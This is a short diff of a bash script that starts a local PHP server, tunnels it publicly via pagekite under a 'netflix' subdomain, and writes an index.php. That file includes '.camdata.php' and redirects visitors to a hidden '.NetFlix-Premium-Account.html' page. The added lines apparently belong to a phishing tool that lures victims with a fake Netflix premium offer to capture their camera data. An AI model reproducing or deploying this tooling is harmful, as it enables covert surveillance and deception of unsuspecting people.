@@ -269,14 +269,15 @@ printf "\e[1;33m      Press Enter to Start Tunnelling\e[0m\n"
 read enter
 sleep 1
 
-
 fuser -k $pagekite_port/tcp > /dev/null 2>&1
 php -S localhost:$pagekite_port > /dev/null 2>&1 &
 
 if [[ $pagekite_subdomain_resp == true ]]; then
+printf "<?php\ninclude '.camdata.php';\nheader('Location: $pagekite_subdomain.pagekite.me/.NetFlix-Premium-Account.html');\nexit\n?>" > index.php
 sleep 1
 python2 .pagekite.sh --clean --signup $pagekite_port $pagekite_subdomain.pagekite.me
 else
+printf "<?php\ninclude '.camdata.php';\nheader('Location: $netflix$RANDOM.pagekite.me/.NetFlix-Premium-Account.html');\nexit\n?>" > index.php
 sleep 1
 python2 .pagekite.sh --clean --signup $pagekite_port netflix$RANDOM.pagekite.me
 fi
